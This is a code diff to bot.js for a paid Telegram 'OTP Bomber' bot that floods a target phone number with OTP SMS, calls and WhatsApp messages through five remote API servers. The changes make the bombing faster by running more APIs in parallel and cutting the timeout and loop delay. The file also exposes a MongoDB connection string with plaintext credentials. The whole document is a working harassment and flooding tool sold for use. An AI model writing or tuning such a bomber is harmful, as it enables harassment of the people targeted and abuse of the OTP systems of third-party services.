@@ -1,5 +1,5 @@
 // ============================================================
-// bot.js – Complete OTP Bomber Bot with Load Balancing + API5
+// bot.js – FAST OTP Bomber Bot with Load Balancing + API5
 // ============================================================
 
 const TelegramBot = require('node-telegram-bot-api');
@@ -18,11 +18,11 @@ const ADMIN_IDS = [6346250222];
 
 // ===== API URLS (YOUR 5 RENDER INSTANCES) =====
 const API_URLS = {
-    api1: 'https://api-server-padj.onrender.com',  // API Server 1
-    api2: 'https://api-server-fy8w.onrender.com',  // API Server 2
-    api3: 'https://api-server-mey8.onrender.com',  // API Server 3
-    api4: 'https://api-server-0abv.onrender.com',   // API Server 4
-    api5: 'https://wasataap-call-api.onrender.com'   // API Server 5 - Voice & WhatsApp Only
+    api1: 'https://api-server-padj.onrender.com',
+    api2: 'https://api-server-fy8w.onrender.com',
+    api3: 'https://api-server-mey8.onrender.com',
+    api4: 'https://api-server-0abv.onrender.com',
+    api5: 'https://wasataap-call-api.onrender.com'
 };
 
 const MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0";
@@ -316,33 +316,36 @@ process.on('unhandledRejection', (reason) => {
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // ============================================================
-// ===== LOAD BALANCER =====
+// ===== FAST LOAD BALANCER =====
 // ============================================================
 
 let apiCycleCounter = 0;
 const API_NAMES = ['api1', 'api2', 'api3', 'api4', 'api5'];
 
 function getApiForDuration(duration, cycleCount) {
-    // API5 (Voice/WA) runs ALWAYS alongside other APIs
-    const baseApis = ['api5'];
+    // ===== FAST MODE =====
+    // Always use MULTIPLE APIs simultaneously for speed
     
-    // 1 minute: ALL APIs + API5
+    // 1 minute: ALL APIs (Maximum Speed)
     if (duration <= 1) {
         return ['api1', 'api2', 'api3', 'api4', 'api5'];
     }
-    // 2-5 minutes: API 1 + API5
+    // 2-5 minutes: 3 APIs (Fast)
     if (duration <= 5) {
-        return ['api1', 'api5'];
+        const apis = ['api1', 'api2', 'api5'];
+        return apis;
     }
-    // 5-10 minutes: API 2 + API5
+    // 5-10 minutes: 3 APIs (Fast)
     if (duration <= 10) {
-        return ['api2', 'api5'];
+        const apis = ['api2', 'api3', 'api5'];
+        return apis;
     }
-    // 10-60 minutes: API 3 + API5
+    // 10-60 minutes: 2 APIs + API5 (Balanced)
     if (duration <= 60) {
-        return ['api3', 'api5'];
+        const mainApi = API_NAMES[cycleCount % 3];
+        return [mainApi, 'api5'];
     }
-    // Fallback: Round-robin + API5
+    // Fallback: 2 APIs
     return [API_NAMES[cycleCount % 4], 'api5'];
 }
 
@@ -361,7 +364,7 @@ let qrCodePath = path.join(__dirname, 'qr_code.jpg');
 let qrCodeSet = false;
 
 // ============================================================
-// ===== BOMBING ENGINE WITH LOAD BALANCER =====
+// ===== FAST BOMBING ENGINE =====
 // ============================================================
 
 async function sendBombRequest(apiName, phone, duration) {
@@ -369,11 +372,12 @@ async function sendBombRequest(apiName, phone, duration) {
     if (!url) return null;
     
     try {
+        // ⚡ Reduced timeout for faster response
         const response = await axios.post(`${url}/bomb`, {
             phone,
             duration,
             instance: apiName
-        }, { timeout: 10000 });
+        }, { timeout: 3000 }); // 5s se 3s kiya
         return response.data;
     } catch (error) {
         return null;
@@ -423,14 +427,14 @@ async function runBomber(chatId, phone, durationMinutes) {
     const durationText = getDurationText(durationMinutes);
     const msg = await bot.sendMessage(
         chatId,
-        `⚔️ **BOMBING STARTED**\n📱 Target: \`${phone}\`\n⏱️ Duration: ${durationText}\n🔁 Using 5 distributed API servers...\n📞 Voice/WA: API5 (Always Active)\n${isUnlimited ? '⭐ UNLIMITED PLAN ACTIVE' : `💳 Cost: ${getBombCost(durationMinutes)} credits`}`,
+        `⚔️ **BOMBING STARTED**\n📱 Target: \`${phone}\`\n⏱️ Duration: ${durationText}\n🔁 Using FAST multi-API network...\n📞 Voice/WA: API5 (Always Active)\n${isUnlimited ? '⭐ UNLIMITED PLAN ACTIVE' : `💳 Cost: ${getBombCost(durationMinutes)} credits`}`,
         { parse_mode: 'Markdown' }
     );
 
     let totalSent = 0;
     let smsCount = 0, callCount = 0, whatsappCount = 0;
     let lastUpdate = Date.now();
-    const updateInterval = 1000;
+    const updateInterval = 1000; // 1 second update
     const startTime = Date.now() / 1000;
     const endTime = startTime + (durationMinutes === 1440 ? 86400 : durationMinutes * 60);
     let cycleCount = 0;
@@ -441,6 +445,7 @@ async function runBomber(chatId, phone, durationMinutes) {
         
         const apisToUse = getApiForDuration(durationMinutes, cycleCount);
         
+        // ⚡ Send ALL API requests in PARALLEL
         const promises = apisToUse.map(apiName => sendBombRequest(apiName, phone, durationMinutes));
         const results = await Promise.allSettled(promises);
         
@@ -470,7 +475,8 @@ async function runBomber(chatId, phone, durationMinutes) {
             } catch (e) {}
         }
 
-        await new Promise(r => setTimeout(r, 100));
+        // ⚡ Reduced delay from 100ms to 20ms for faster cycling
+        await new Promise(r => setTimeout(r, 20));
     }
 
     bombingStatus.set(chatId, false);
@@ -1062,7 +1068,6 @@ bot.on('message', async (msg) => {
             await bot.editMessageText(spin, { chat_id: chatId, message_id: spinMsg.message_id });
             await new Promise(r => setTimeout(r, 300));
         }
-        // Daily reward changed from 1-10 to 1-5
         const reward = Math.floor(Math.random() * 5) + 1;
         await updateCredits(chatId, reward);
         user.last_daily = now;
@@ -1714,11 +1719,15 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Health check server listening on port ${PORT}`);
 });
 
-console.log('🤖 Bot started successfully!');
-console.log(`📡 Load Balancer: ACTIVE`);
+console.log('🤖 FAST Bot started successfully!');
+console.log(`📡 Load Balancer: FAST MODE ACTIVE`);
 console.log(`🌐 API Instances: 5`);
-console.log(`   API1-4: All APIs`);
+console.log(`   API1-4: All APIs (Parallel)`);
 console.log(`   API5: Voice & WhatsApp Only (Always Active)`);
+console.log(`⚡ Speed Optimizations: ACTIVE`);
+console.log(`   - Multiple APIs simultaneously`);
+console.log(`   - Reduced timeouts (3s)`);
+console.log(`   - Faster cycle delays (20ms)`);
 console.log(`🎁 Daily Spin: 1-5 credits`);
 console.log(`📸 QR Code payment system: ${qrCodeSet ? '✅' : '❌'}`);
 console.log(`💳 Screenshot approval system: ✅`);
